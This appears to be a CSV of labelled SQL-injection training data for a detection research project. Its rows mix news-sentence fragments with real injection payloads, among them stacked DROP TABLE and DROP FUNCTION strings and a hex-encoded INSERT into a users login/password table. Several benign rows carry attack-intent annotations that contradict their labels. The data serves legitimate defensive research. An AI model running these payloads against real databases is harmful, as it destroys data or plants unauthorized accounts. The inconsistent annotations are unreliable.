row_id,source_dataset,source_file,raw_label,raw_sql,sql_normalized,input_type,main_verb,target_tables,target_columns,initial_category,initial_impact,initial_intent,canonical_intent,attack_effect_initial,prompt_style,review_flag_unknown_verb,review_flag_empty_canonical_intent,review_flag_no_target_tables,review_flag_suspect_row,keep,dialect_guess,manual_category,manual_impact,manual_intent,target_table_canonical,prompt_domain_entity,expected_sql_operation,expected_security_violation,requires_sensitive_table,notes,semantic_category,semantic_impact,semantic_intent,semantic_canonical_intent,attack_technique,expected_security_violation.1,uses_union,uses_subquery,uses_stacked_query,uses_comment_termination,uses_time_function,uses_schema_enumeration,problematic_annotation,expected_missing_verb_for_fragment,expected_missing_table_for_fragment,review_flag_problematic_row,target_table_primary,target_num_prompts
33441,sqliv2,C:\Users\Polyana\Documents\pesquisa-P2SQL\data\raw\sqliv2.csv,0,Montreal-based Bombardier also release flight test data brand-new CSeries aircraft offer update whether plane meet ambitious schedule going commercial service next September,MONTREAL-BASED BOMBARDIER ALSO RELEASE FLIGHT TEST DATA BRAND-NEW CSERIES AIRCRAFT OFFER UPDATE WHETHER PLANE MEET AMBITIOUS SCHEDULE GOING COMMERCIAL SERVICE NEXT SEPTEMBER,injection_fragment,UPDATE,whether,,B,legitimate,perform legitimate write operation,perform legitimate write operation,B,,False,False,False,False,,,,,,,,,,,,T2,integrity,modify unauthorized records,modify unauthorized records,write_fragment,integrity,False,False,False,False,False,False,False,False,False,False,whether,3
598,Modified_SQL_Dataset,C:\Users\Polyana\Documents\pesquisa-P2SQL\data\raw\Modified_SQL_Dataset.csv,1,"insert into users  (  login, password, level  )   values  (   char  (  0x70  )   + char  (  0x65  )   + char  (  0x74  )   + char  (  0x65  )   + char  (  0x72  )   + char  (  0x70  )   + char  (  0x65  )   + char  (  0x74  )   + char  (  0x65  )   + char  (  0x72  )  ,char  (  0x64  )","INSERT INTO USERS ( LOGIN, PASSWORD, LEVEL ) VALUES ( CHAR ( 0X70 ) + CHAR ( 0X65 ) + CHAR ( 0X74 ) + CHAR ( 0X65 ) + CHAR ( 0X72 ) + CHAR ( 0X70 ) + CHAR ( 0X65 ) + CHAR ( 0X74 ) + CHAR ( 0X65 ) + CHAR ( 0X72 ) ,CHAR ( 0X64 )",full_query,INSERT,"users, users ( login, password, level )",,T2,integrity,insert unauthorized records,insert unauthorized records into users,T2,,False,False,False,False,,,,,,,,,,,,T2,integrity,insert unauthorized records,insert unauthorized records into users,write_query,integrity,False,False,False,False,False,False,False,False,False,False,users,3
34720,sqliv2,C:\Users\Polyana\Documents\pesquisa-P2SQL\data\raw\sqliv2.csv,0,"gov accessible several hours tonight internal error occurred scheduled update , &quot; spy agency said emailed statement","GOV ACCESSIBLE SEVERAL HOURS TONIGHT INTERNAL ERROR OCCURRED SCHEDULED UPDATE , &QUOT; SPY AGENCY SAID EMAILED STATEMENT",injection_fragment,UPDATE,,,B,legitimate,perform legitimate write operation,perform legitimate write operation,B,,False,False,True,True,,,,,,,,,,,,T2,integrity,modify unauthorized records,modify unauthorized records,stacked_write_or_ddl_fragment,integrity,False,False,True,False,False,False,False,False,True,False,,3
32081,sqliv2,C:\Users\Polyana\Documents\pesquisa-P2SQL\data\raw\sqliv2.csv,0,We decided first flight update period &apos;s done,WE DECIDED FIRST FLIGHT UPDATE PERIOD &APOS;S DONE,injection_fragment,UPDATE,"period, period &apos",,B,legitimate,perform legitimate write operation,perform legitimate write operation,B,,False,False,False,False,,,,,,,,,,,,T2,integrity,modify unauthorized records,modify unauthorized records,stacked_write_or_ddl_fragment,integrity,False,False,True,False,False,False,False,False,False,False,period,3
33277,sqliv2,C:\Users\Polyana\Documents\pesquisa-P2SQL\data\raw\sqliv2.csv,0,"As result , stock exchange operators required almost entire day look delete orders","AS RESULT , STOCK EXCHANGE OPERATORS REQUIRED ALMOST ENTIRE DAY LOOK DELETE ORDERS",injection_fragment,DELETE,,,B,legitimate,perform legitimate write operation,perform legitimate write operation,B,,False,False,True,True,,,,,,,,,,,,T2,integrity,modify unauthorized records,modify unauthorized records,write_fragment,integrity,False,False,False,False,False,False,False,False,True,False,,3
32609,sqliv2,C:\Users\Polyana\Documents\pesquisa-P2SQL\data\raw\sqliv2.csv,0,Bombardier said evaluating entry-into-service (EIS) schedule provide update next months,BOMBARDIER SAID EVALUATING ENTRY-INTO-SERVICE (EIS) SCHEDULE PROVIDE UPDATE NEXT MONTHS,injection_fragment,UPDATE,"next, -",,B,legitimate,perform legitimate write operation,perform legitimate write operation,B,,False,False,False,False,,,,,,,,,,,,T2,integrity,modify unauthorized records,modify unauthorized records,write_fragment,integrity,False,False,False,False,False,False,False,False,False,False,next,3
34214,sqliv2,C:\Users\Polyana\Documents\pesquisa-P2SQL\data\raw\sqliv2.csv,0,cgi yes sub0202 photo 2 1 yetglezip 71 75 e_qna view eng 25 47817 e_qna eng delete 41 24242 bbs314 129-945,CGI YES SUB0202 PHOTO 2 1 YETGLEZIP 71 75 E_QNA VIEW ENG 25 47817 E_QNA ENG DELETE 41 24242 BBS314 129-945,injection_fragment,DELETE,,,B,legitimate,perform legitimate write operation,perform legitimate write operation,B,,False,False,True,True,,,,,,,,,,,,T2,integrity,modify unauthorized records,modify unauthorized records,write_fragment,integrity,False,False,False,False,False,False,False,False,True,False,,3
8542,Modified_SQL_Dataset,C:\Users\Polyana\Documents\pesquisa-P2SQL\data\raw\Modified_SQL_Dataset.csv,1,if  (  2643  =  1393  )   select 2643 else drop function nqss--,IF ( 2643 = 1393 ) SELECT 2643 ELSE DROP FUNCTION NQSS--,injection_fragment,SELECT,,,T1,confidentiality,exfiltrate data,exfiltrate data from unknown_table,T1,,False,False,True,True,,,,,,,,,,,,T3,availability/integrity,destroy or alter database structure,destroy or alter database structure,comment_terminated_fragment,availability/integrity,False,False,False,True,False,False,False,False,True,False,,3
1681,Modified_SQL_Dataset,C:\Users\Polyana\Documents\pesquisa-P2SQL\data\raw\Modified_SQL_Dataset.csv,1,if  (  5896  =  4251  )   select 5896 else drop function xmyk--,IF ( 5896 = 4251 ) SELECT 5896 ELSE DROP FUNCTION XMYK--,injection_fragment,SELECT,,,T1,confidentiality,exfiltrate data,exfiltrate data from unknown_table,T1,,False,False,True,True,,,,,,,,,,,,T3,availability/integrity,destroy or alter database structure,destroy or alter database structure,comment_terminated_fragment,availability/integrity,False,False,False,True,False,False,False,False,True,False,,3
8705,Modified_SQL_Dataset,C:\Users\Polyana\Documents\pesquisa-P2SQL\data\raw\Modified_SQL_Dataset.csv,1,if  (  7340  =  9813  )   select 7340 else drop function yppp--,IF ( 7340 = 9813 ) SELECT 7340 ELSE DROP FUNCTION YPPP--,injection_fragment,SELECT,,,T1,confidentiality,exfiltrate data,exfiltrate data from unknown_table,T1,,False,False,True,True,,,,,,,,,,,,T3,availability/integrity,destroy or alter database structure,destroy or alter database structure,comment_terminated_fragment,availability/integrity,False,False,False,True,False,False,False,False,True,False,,3
4390,Modified_SQL_Dataset,C:\Users\Polyana\Documents\pesquisa-P2SQL\data\raw\Modified_SQL_Dataset.csv,1,if  (  7899  =  7899  )   select 7899 else drop function zbbp--,IF ( 7899 = 7899 ) SELECT 7899 ELSE DROP FUNCTION ZBBP--,injection_fragment,SELECT,,,T1,confidentiality,exfiltrate data,exfiltrate data from unknown_table,T1,,False,False,True,True,,,,,,,,,,,,T3,availability/integrity,destroy or alter database structure,destroy or alter database structure,comment_terminated_fragment,availability/integrity,False,False,False,True,False,False,False,False,True,False,,3
5379,Modified_SQL_Dataset,C:\Users\Polyana\Documents\pesquisa-P2SQL\data\raw\Modified_SQL_Dataset.csv,1,if  (  8995  =  9787  )   select 8995 else drop function ofgg--,IF ( 8995 = 9787 ) SELECT 8995 ELSE DROP FUNCTION OFGG--,injection_fragment,SELECT,,,T1,confidentiality,exfiltrate data,exfiltrate data from unknown_table,T1,,False,False,True,True,,,,,,,,,,,,T3,availability/integrity,destroy or alter database structure,destroy or alter database structure,comment_terminated_fragment,availability/integrity,False,False,False,True,False,False,False,False,True,False,,3
33813,sqliv2,C:\Users\Polyana\Documents\pesquisa-P2SQL\data\raw\sqliv2.csv,0,Oil extends drop toward $ 96 barrel The price oil continued fall Friday concerns high supplies offset report showing China &apos;s power-hungry manufacturing sector strengthening,OIL EXTENDS DROP TOWARD $ 96 BARREL THE PRICE OIL CONTINUED FALL FRIDAY CONCERNS HIGH SUPPLIES OFFSET REPORT SHOWING CHINA &APOS;S POWER-HUNGRY MANUFACTURING SECTOR STRENGTHENING,injection_fragment,DROP,,,B,legitimate,perform legitimate write operation,perform legitimate write operation,B,,False,False,True,True,,,,,,,,,,,,T3,availability/integrity,destroy or alter database structure,destroy or alter database structure,stacked_write_or_ddl_fragment,availability/integrity,False,False,True,False,False,False,False,False,True,False,,3
11004,Modified_SQL_Dataset,C:\Users\Polyana\Documents\pesquisa-P2SQL\data\raw\Modified_SQL_Dataset.csv,1,if  (  1665  =  3845  )   select 1665 else drop function nzod--,IF ( 1665 = 3845 ) SELECT 1665 ELSE DROP FUNCTION NZOD--,injection_fragment,SELECT,,,T1,confidentiality,exfiltrate data,exfiltrate data from unknown_table,T1,,False,False,True,True,,,,,,,,,,,,T3,availability/integrity,destroy or alter database structure,destroy or alter database structure,comment_terminated_fragment,availability/integrity,False,False,False,True,False,False,False,False,True,False,,3
7038,Modified_SQL_Dataset,C:\Users\Polyana\Documents\pesquisa-P2SQL\data\raw\Modified_SQL_Dataset.csv,1,if  (  4194  =  4133  )   select 4194 else drop function tqhz--,IF ( 4194 = 4133 ) SELECT 4194 ELSE DROP FUNCTION TQHZ--,injection_fragment,SELECT,,,T1,confidentiality,exfiltrate data,exfiltrate data from unknown_table,T1,,False,False,True,True,,,,,,,,,,,,T3,availability/integrity,destroy or alter database structure,destroy or alter database structure,comment_terminated_fragment,availability/integrity,False,False,False,True,False,False,False,False,True,False,,3
31417,sqliv2,C:\Users\Polyana\Documents\pesquisa-P2SQL\data\raw\sqliv2.csv,1,' ; drop table temp --,' ; DROP TABLE TEMP --,injection_fragment,UNKNOWN,temp,,T?,unknown,unknown malicious action,unknown malicious action,,,True,False,False,True,,,,,,,,,,,,T3,availability/integrity,destroy or alter database structure,destroy or alter database structure,stacked_write_or_ddl_fragment,availability/integrity,False,False,True,True,False,False,False,True,False,False,temp,3
4101,Modified_SQL_Dataset,C:\Users\Polyana\Documents\pesquisa-P2SQL\data\raw\Modified_SQL_Dataset.csv,1,if  (  8264  =  1939  )   select 8264 else drop function nsoq--,IF ( 8264 = 1939 ) SELECT 8264 ELSE DROP FUNCTION NSOQ--,injection_fragment,SELECT,,,T1,confidentiality,exfiltrate data,exfiltrate data from unknown_table,T1,,False,False,True,True,,,,,,,,,,,,T3,availability/integrity,destroy or alter database structure,destroy or alter database structure,comment_terminated_fragment,availability/integrity,False,False,False,True,False,False,False,False,True,False,,3
34241,sqliv2,C:\Users\Polyana\Documents\pesquisa-P2SQL\data\raw\sqliv2.csv,0,"Soon drop , Scarborough regular phone contact Ditta dinner Blackburn Rovers football stadium , Ewood Park","SOON DROP , SCARBOROUGH REGULAR PHONE CONTACT DITTA DINNER BLACKBURN ROVERS FOOTBALL STADIUM , EWOOD PARK",injection_fragment,DROP,,,B,legitimate,perform legitimate write operation,perform legitimate write operation,B,,False,False,True,True,,,,,,,,,,,,T3,availability/integrity,destroy or alter database structure,destroy or alter database structure,ddl_fragment,availability/integrity,False,False,False,False,False,False,False,False,True,False,,3
1375,Modified_SQL_Dataset,C:\Users\Polyana\Documents\pesquisa-P2SQL\data\raw\Modified_SQL_Dataset.csv,1,if  (  3490  =  4920  )   select 3490 else drop function hlzt--,IF ( 3490 = 4920 ) SELECT 3490 ELSE DROP FUNCTION HLZT--,injection_fragment,SELECT,,,T1,confidentiality,exfiltrate data,exfiltrate data from unknown_table,T1,,False,False,True,True,,,,,,,,,,,,T3,availability/integrity,destroy or alter database structure,destroy or alter database structure,comment_terminated_fragment,availability/integrity,False,False,False,True,False,False,False,False,True,False,,3
8798,Modified_SQL_Dataset,C:\Users\Polyana\Documents\pesquisa-P2SQL\data\raw\Modified_SQL_Dataset.csv,1,if  (  9770  =  9748  )   select 9770 else drop function zyuo--,IF ( 9770 = 9748 ) SELECT 9770 ELSE DROP FUNCTION ZYUO--,injection_fragment,SELECT,,,T1,confidentiality,exfiltrate data,exfiltrate data from unknown_table,T1,,False,False,True,True,,,,,,,,,,,,T3,availability/integrity,destroy or alter database structure,destroy or alter database structure,comment_terminated_fragment,availability/integrity,False,False,False,True,False,False,False,False,True,False,,3
9103,Modified_SQL_Dataset,C:\Users\Polyana\Documents\pesquisa-P2SQL\data\raw\Modified_SQL_Dataset.csv,1,if  (  5316  =  4416  )   select 5316 else drop function vtve--,IF ( 5316 = 4416 ) SELECT 5316 ELSE DROP FUNCTION VTVE--,injection_fragment,SELECT,,,T1,confidentiality,exfiltrate data,exfiltrate data from unknown_table,T1,,False,False,True,True,,,,,,,,,,,,T3,availability/integrity,destroy or alter database structure,destroy or alter database structure,comment_terminated_fragment,availability/integrity,False,False,False,True,False,False,False,False,True,False,,3
2784,Modified_SQL_Dataset,C:\Users\Polyana\Documents\pesquisa-P2SQL\data\raw\Modified_SQL_Dataset.csv,1,if  (  4735  =  8907  )   select 4735 else drop function qigo--,IF ( 4735 = 8907 ) SELECT 4735 ELSE DROP FUNCTION QIGO--,injection_fragment,SELECT,,,T1,confidentiality,exfiltrate data,exfiltrate data from unknown_table,T1,,False,False,True,True,,,,,,,,,,,,T3,availability/integrity,destroy or alter database structure,destroy or alter database structure,comment_terminated_fragment,availability/integrity,False,False,False,True,False,False,False,False,True,False,,3
5323,Modified_SQL_Dataset,C:\Users\Polyana\Documents\pesquisa-P2SQL\data\raw\Modified_SQL_Dataset.csv,1,if  (  2695  =  9045  )   select 2695 else drop function qmno--,IF ( 2695 = 9045 ) SELECT 2695 ELSE DROP FUNCTION QMNO--,injection_fragment,SELECT,,,T1,confidentiality,exfiltrate data,exfiltrate data from unknown_table,T1,,False,False,True,True,,,,,,,,,,,,T3,availability/integrity,destroy or alter database structure,destroy or alter database structure,comment_terminated_fragment,availability/integrity,False,False,False,True,False,False,False,False,True,False,,3
2379,Modified_SQL_Dataset,C:\Users\Polyana\Documents\pesquisa-P2SQL\data\raw\Modified_SQL_Dataset.csv,1,if  (  1087  =  5839  )   select 1087 else drop function zzeh--,IF ( 1087 = 5839 ) SELECT 1087 ELSE DROP FUNCTION ZZEH--,injection_fragment,SELECT,,,T1,confidentiality,exfiltrate data,exfiltrate data from unknown_table,T1,,False,False,True,True,,,,,,,,,,,,T3,availability/integrity,destroy or alter database structure,destroy or alter database structure,comment_terminated_fragment,availability/integrity,False,False,False,True,False,False,False,False,True,False,,3
1627,Modified_SQL_Dataset,C:\Users\Polyana\Documents\pesquisa-P2SQL\data\raw\Modified_SQL_Dataset.csv,1,if  (  8537  =  7034  )   select 8537 else drop function vqmp--,IF ( 8537 = 7034 ) SELECT 8537 ELSE DROP FUNCTION VQMP--,injection_fragment,SELECT,,,T1,confidentiality,exfiltrate data,exfiltrate data from unknown_table,T1,,False,False,True,True,,,,,,,,,,,,T3,availability/integrity,destroy or alter database structure,destroy or alter database structure,comment_terminated_fragment,availability/integrity,False,False,False,True,False,False,False,False,True,False,,3
33261,sqliv2,C:\Users\Polyana\Documents\pesquisa-P2SQL\data\raw\sqliv2.csv,0,"&quot; Cell phones , really issue , potentially could create interference navigational devices , know , according FCC , could interfere cell phone towers &apos;re air , &quot; Rosenker said","&QUOT; CELL PHONES , REALLY ISSUE , POTENTIALLY COULD CREATE INTERFERENCE NAVIGATIONAL DEVICES , KNOW , ACCORDING FCC , COULD INTERFERE CELL PHONE TOWERS &APOS;RE AIR , &QUOT; ROSENKER SAID",injection_fragment,UNKNOWN,,,B,legitimate,unknown legitimate action,unknown legitimate action,B,,True,False,True,True,,,,,,,,,,,,T3,availability/integrity,destroy or alter database structure,destroy or alter database structure,stacked_write_or_ddl_fragment,availability/integrity,False,False,True,False,False,False,False,True,True,False,,3
7165,Modified_SQL_Dataset,C:\Users\Polyana\Documents\pesquisa-P2SQL\data\raw\Modified_SQL_Dataset.csv,1,if  (  5127  =  2829  )   select 5127 else drop function okos--,IF ( 5127 = 2829 ) SELECT 5127 ELSE DROP FUNCTION OKOS--,injection_fragment,SELECT,,,T1,confidentiality,exfiltrate data,exfiltrate data from unknown_table,T1,,False,False,True,True,,,,,,,,,,,,T3,availability/integrity,destroy or alter database structure,destroy or alter database structure,comment_terminated_fragment,availability/integrity,False,False,False,True,False,False,False,False,True,False,,3
32795,sqliv2,C:\Users\Polyana\Documents\pesquisa-P2SQL\data\raw\sqliv2.csv,0,"Pope Francis name first cardinals February Pope Francis create new cardinals Catholic Church first time February 22 , Vatican announced Thursday","POPE FRANCIS NAME FIRST CARDINALS FEBRUARY POPE FRANCIS CREATE NEW CARDINALS CATHOLIC CHURCH FIRST TIME FEBRUARY 22 , VATICAN ANNOUNCED THURSDAY",injection_fragment,CREATE,,,B,legitimate,perform legitimate write operation,perform legitimate write operation,B,,False,False,True,True,,,,,,,,,,,,T3,availability/integrity,destroy or alter database structure,destroy or alter database structure,ddl_fragment,availability/integrity,False,False,False,False,False,False,False,False,True,False,,3
32641,sqliv2,C:\Users\Polyana\Documents\pesquisa-P2SQL\data\raw\sqliv2.csv,0,"What Le Pen newfound popularity among French white , working class ? She wants use next year &apos;s EU elections create anti-EU , anti-common currency bloc across European Parliament","WHAT LE PEN NEWFOUND POPULARITY AMONG FRENCH WHITE , WORKING CLASS ? SHE WANTS USE NEXT YEAR &APOS;S EU ELECTIONS CREATE ANTI-EU , ANTI-COMMON CURRENCY BLOC ACROSS EUROPEAN PARLIAMENT",injection_fragment,UNKNOWN,,,B,legitimate,unknown legitimate action,unknown legitimate action,B,,True,False,True,True,,,,,,,,,,,,T3,availability/integrity,destroy or alter database structure,destroy or alter database structure,stacked_write_or_ddl_fragment,availability/integrity,False,False,True,False,False,False,False,True,True,False,,3
34478,sqliv2,C:\Users\Polyana\Documents\pesquisa-P2SQL\data\raw\sqliv2.csv,0,The goal adjustment create relaxing atmosphere,THE GOAL ADJUSTMENT CREATE RELAXING ATMOSPHERE,injection_fragment,CREATE,,,B,legitimate,perform legitimate write operation,perform legitimate write operation,B,,False,False,True,True,,,,,,,,,,,,T3,availability/integrity,destroy or alter database structure,destroy or alter database structure,ddl_fragment,availability/integrity,False,False,False,False,False,False,False,False,True,False,,3
4776,Modified_SQL_Dataset,C:\Users\Polyana\Documents\pesquisa-P2SQL\data\raw\Modified_SQL_Dataset.csv,1,if  (  7427  =  7800  )   select 7427 else drop function dgir--,IF ( 7427 = 7800 ) SELECT 7427 ELSE DROP FUNCTION DGIR--,injection_fragment,SELECT,,,T1,confidentiality,exfiltrate data,exfiltrate data from unknown_table,T1,,False,False,True,True,,,,,,,,,,,,T3,availability/integrity,destroy or alter database structure,destroy or alter database structure,comment_terminated_fragment,availability/integrity,False,False,False,True,False,False,False,False,True,False,,3
3080,Modified_SQL_Dataset,C:\Users\Polyana\Documents\pesquisa-P2SQL\data\raw\Modified_SQL_Dataset.csv,1,if  (  9431  =  6730  )   select 9431 else drop function xbkh--,IF ( 9431 = 6730 ) SELECT 9431 ELSE DROP FUNCTION XBKH--,injection_fragment,SELECT,,,T1,confidentiality,exfiltrate data,exfiltrate data from unknown_table,T1,,False,False,True,True,,,,,,,,,,,,T3,availability/integrity,destroy or alter database structure,destroy or alter database structure,comment_terminated_fragment,availability/integrity,False,False,False,True,False,False,False,False,True,False,,3
5304,Modified_SQL_Dataset,C:\Users\Polyana\Documents\pesquisa-P2SQL\data\raw\Modified_SQL_Dataset.csv,1,if  (  4135  =  2165  )   select 4135 else drop function otyy--,IF ( 4135 = 2165 ) SELECT 4135 ELSE DROP FUNCTION OTYY--,injection_fragment,SELECT,,,T1,confidentiality,exfiltrate data,exfiltrate data from unknown_table,T1,,False,False,True,True,,,,,,,,,,,,T3,availability/integrity,destroy or alter database structure,destroy or alter database structure,comment_terminated_fragment,availability/integrity,False,False,False,True,False,False,False,False,True,False,,3
6675,Modified_SQL_Dataset,C:\Users\Polyana\Documents\pesquisa-P2SQL\data\raw\Modified_SQL_Dataset.csv,1,if  (  2697  =  2008  )   select 2697 else drop function jcoo--,IF ( 2697 = 2008 ) SELECT 2697 ELSE DROP FUNCTION JCOO--,injection_fragment,SELECT,,,T1,confidentiality,exfiltrate data,exfiltrate data from unknown_table,T1,,False,False,True,True,,,,,,,,,,,,T3,availability/integrity,destroy or alter database structure,destroy or alter database structure,comment_terminated_fragment,availability/integrity,False,False,False,True,False,False,False,False,True,False,,3
8078,Modified_SQL_Dataset,C:\Users\Polyana\Documents\pesquisa-P2SQL\data\raw\Modified_SQL_Dataset.csv,1,if  (  6624  =  4232  )   select 6624 else drop function xyyt--,IF ( 6624 = 4232 ) SELECT 6624 ELSE DROP FUNCTION XYYT--,injection_fragment,SELECT,,,T1,confidentiality,exfiltrate data,exfiltrate data from unknown_table,T1,,False,False,True,True,,,,,,,,,,,,T3,availability/integrity,destroy or alter database structure,destroy or alter database structure,comment_terminated_fragment,availability/integrity,False,False,False,True,False,False,False,False,True,False,,3
9510,Modified_SQL_Dataset,C:\Users\Polyana\Documents\pesquisa-P2SQL\data\raw\Modified_SQL_Dataset.csv,1,if  (  6767  =  5022  )   select 6767 else drop function buii--,IF ( 6767 = 5022 ) SELECT 6767 ELSE DROP FUNCTION BUII--,injection_fragment,SELECT,,,T1,confidentiality,exfiltrate data,exfiltrate data from unknown_table,T1,,False,False,True,True,,,,,,,,,,,,T3,availability/integrity,destroy or alter database structure,destroy or alter database structure,comment_terminated_fragment,availability/integrity,False,False,False,True,False,False,False,False,True,False,,3
6893,Modified_SQL_Dataset,C:\Users\Polyana\Documents\pesquisa-P2SQL\data\raw\Modified_SQL_Dataset.csv,1,if  (  3245  =  6168  )   select 3245 else drop function nafj--,IF ( 3245 = 6168 ) SELECT 3245 ELSE DROP FUNCTION NAFJ--,injection_fragment,SELECT,,,T1,confidentiality,exfiltrate data,exfiltrate data from unknown_table,T1,,False,False,True,True,,,,,,,,,,,,T3,availability/integrity,destroy or alter database structure,destroy or alter database structure,comment_terminated_fragment,availability/integrity,False,False,False,True,False,False,False,False,True,False,,3
3674,Modified_SQL_Dataset,C:\Users\Polyana\Documents\pesquisa-P2SQL\data\raw\Modified_SQL_Dataset.csv,1,if  (  1928  =  4811  )   select 1928 else drop function ucko--,IF ( 1928 = 4811 ) SELECT 1928 ELSE DROP FUNCTION UCKO--,injection_fragment,SELECT,,,T1,confidentiality,exfiltrate data,exfiltrate data from unknown_table,T1,,False,False,True,True,,,,,,,,,,,,T3,availability/integrity,destroy or alter database structure,destroy or alter database structure,comment_terminated_fragment,availability/integrity,False,False,False,True,False,False,False,False,True,False,,3
930,Modified_SQL_Dataset,C:\Users\Polyana\Documents\pesquisa-P2SQL\data\raw\Modified_SQL_Dataset.csv,1,if  (  8284  =  6171  )   select 8284 else drop function mbih--,IF ( 8284 = 6171 ) SELECT 8284 ELSE DROP FUNCTION MBIH--,injection_fragment,SELECT,,,T1,confidentiality,exfiltrate data,exfiltrate data from unknown_table,T1,,False,False,True,True,,,,,,,,,,,,T3,availability/integrity,destroy or alter database structure,destroy or alter database structure,comment_terminated_fragment,availability/integrity,False,False,False,True,False,False,False,False,True,False,,3
33783,sqliv2,C:\Users\Polyana\Documents\pesquisa-P2SQL\data\raw\sqliv2.csv,0,The majority users parking garage therefore hurry past Roman relics simply drop car,THE MAJORITY USERS PARKING GARAGE THEREFORE HURRY PAST ROMAN RELICS SIMPLY DROP CAR,injection_fragment,DROP,,,B,legitimate,perform legitimate write operation,perform legitimate write operation,B,,False,False,True,True,,,,,,,,,,,,T3,availability/integrity,destroy or alter database structure,destroy or alter database structure,ddl_fragment,availability/integrity,False,False,False,False,False,False,False,False,True,False,,3
9368,Modified_SQL_Dataset,C:\Users\Polyana\Documents\pesquisa-P2SQL\data\raw\Modified_SQL_Dataset.csv,1,if  (  8182  =  3225  )   select 8182 else drop function kpzk--,IF ( 8182 = 3225 ) SELECT 8182 ELSE DROP FUNCTION KPZK--,injection_fragment,SELECT,,,T1,confidentiality,exfiltrate data,exfiltrate data from unknown_table,T1,,False,False,True,True,,,,,,,,,,,,T3,availability/integrity,destroy or alter database structure,destroy or alter database structure,comment_terminated_fragment,availability/integrity,False,False,False,True,False,False,False,False,True,False,,3
7708,Modified_SQL_Dataset,C:\Users\Polyana\Documents\pesquisa-P2SQL\data\raw\Modified_SQL_Dataset.csv,1,if  (  2823  =  3532  )   select 2823 else drop function kmqw--,IF ( 2823 = 3532 ) SELECT 2823 ELSE DROP FUNCTION KMQW--,injection_fragment,SELECT,,,T1,confidentiality,exfiltrate data,exfiltrate data from unknown_table,T1,,False,False,True,True,,,,,,,,,,,,T3,availability/integrity,destroy or alter database structure,destroy or alter database structure,comment_terminated_fragment,availability/integrity,False,False,False,True,False,False,False,False,True,False,,3
10127,Modified_SQL_Dataset,C:\Users\Polyana\Documents\pesquisa-P2SQL\data\raw\Modified_SQL_Dataset.csv,1,if  (  3392  =  4422  )   select 3392 else drop function xsqq--,IF ( 3392 = 4422 ) SELECT 3392 ELSE DROP FUNCTION XSQQ--,injection_fragment,SELECT,,,T1,confidentiality,exfiltrate data,exfiltrate data from unknown_table,T1,,False,False,True,True,,,,,,,,,,,,T3,availability/integrity,destroy or alter database structure,destroy or alter database structure,comment_terminated_fragment,availability/integrity,False,False,False,True,False,False,False,False,True,False,,3
970,Modified_SQL_Dataset,C:\Users\Polyana\Documents\pesquisa-P2SQL\data\raw\Modified_SQL_Dataset.csv,1,if  (  8858  =  5680  )   select 8858 else drop function pyuo--,IF ( 8858 = 5680 ) SELECT 8858 ELSE DROP FUNCTION PYUO--,injection_fragment,SELECT,,,T1,confidentiality,exfiltrate data,exfiltrate data from unknown_table,T1,,False,False,True,True,,,,,,,,,,,,T3,availability/integrity,destroy or alter database structure,destroy or alter database structure,comment_terminated_fragment,availability/integrity,False,False,False,True,False,False,False,False,True,False,,3
5805,Modified_SQL_Dataset,C:\Users\Polyana\Documents\pesquisa-P2SQL\data\raw\Modified_SQL_Dataset.csv,1,if  (  6842  =  5446  )   select 6842 else drop function vjfq--,IF ( 6842 = 5446 ) SELECT 6842 ELSE DROP FUNCTION VJFQ--,injection_fragment,SELECT,,,T1,confidentiality,exfiltrate data,exfiltrate data from unknown_table,T1,,False,False,True,True,,,,,,,,,,,,T3,availability/integrity,destroy or alter database structure,destroy or alter database structure,comment_terminated_fragment,availability/integrity,False,False,False,True,False,False,False,False,True,False,,3
1373,Modified_SQL_Dataset,C:\Users\Polyana\Documents\pesquisa-P2SQL\data\raw\Modified_SQL_Dataset.csv,1,if  (  3831  =  9321  )   select 3831 else drop function ybru--,IF ( 3831 = 9321 ) SELECT 3831 ELSE DROP FUNCTION YBRU--,injection_fragment,SELECT,,,T1,confidentiality,exfiltrate data,exfiltrate data from unknown_table,T1,,False,False,True,True,,,,,,,,,,,,T3,availability/integrity,destroy or alter database structure,destroy or alter database structure,comment_terminated_fragment,availability/integrity,False,False,False,True,False,False,False,False,True,False,,3
